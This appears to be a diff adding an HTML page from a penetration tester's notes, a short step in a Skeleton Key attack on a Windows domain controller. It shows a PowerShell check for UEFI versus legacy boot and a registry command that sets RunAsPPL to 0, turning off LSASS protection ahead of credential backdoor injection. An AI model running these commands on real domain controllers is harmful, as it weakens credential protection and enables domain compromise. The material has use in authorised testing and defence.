@@ -1,0 +1,37 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>inject a Skeleton Key by restarting the DC</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>inject a Skeleton Key by restarting the DC</h1><br /><br />WARNING: After doing this procedure on
+    a Domain Controller a restart is needed to make effective the new value of the registry key
+    &quot;RunAsPPL&quot;<br /><br /><strong>BIOS Legancy or BIOS UEFI?</strong><br />To check if we have UEFI BIOS
+    configuration(<a href="https://wintech.sgal.info/2016/12/easy-way-to-determine-uefi-or-legacy.html" target="_blank">found
+      here</a>):<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;$env:firmware_type&nbsp;&nbsp;&nbsp;&nbsp;#easier,&nbsp;check&nbsp;the&nbsp;enviroment&nbsp;variable<br />PS&gt;&nbsp;if&nbsp;(Test-Path&nbsp;$env:windir\Panther\setupact.log)&nbsp;{(Select-String&nbsp;&#39;Detected&nbsp;boot&nbsp;environment&#39;&nbsp;-Path&nbsp;&quot;$env:windir\Panther\setupact.log&quot;&nbsp;&nbsp;-AllMatches).line&nbsp;-replace&nbsp;&#39;.*:\s+&#39;}&nbsp;else&nbsp;{if&nbsp;(Test-Path&nbsp;HKLM:\System\CurrentControlSet\control\SecureBoot\State)&nbsp;{&quot;UEFI&quot;}&nbsp;else&nbsp;{&quot;BIOS&quot;}}<br />
+      </div>
+    </div><br /> ◇ <span style="text-decoration:underline;">BIOS Legacy</span>: means that to disable LSASS Protection
+    we need only <span style="color:#ff0000;">delete/disable</span> the RunAsPPL registry key and restart the
+    Server.<br />
+    <div class="codebox">
+      <div class="codebox">
+        C:\&gt;&nbsp;reg&nbsp;add&nbsp;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&nbsp;/v&nbsp;RunAsPPL&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;0&nbsp;/f&nbsp;&nbsp;#disable&nbsp;LSA&nbsp;protection&nbsp;on&nbsp;the&nbsp;machine
+      </div>
+    </div><br /> ◇ <span style="text-decoration:underline;">BIOS UEFI</span>: the LSASS Protection status is also
+    written to a variable in the UEFI configuration. After we have <span style="color:#ff0000;">deleted/disabled</span>
+    the registry key &quot;RunAsPPL&quot; we need to change also the UEFI BIOS configuration(<a
+      href="https://support.authlogics.com/hc/en-us/articles/360012317780-PPA-does-not-function-when-Windows-Local-Security-Authority-LSA-Protection-is-enabled?mobile_site=true" target="_blank">see
+      here</a>)
+  </div>
+</body>
+
+</html>
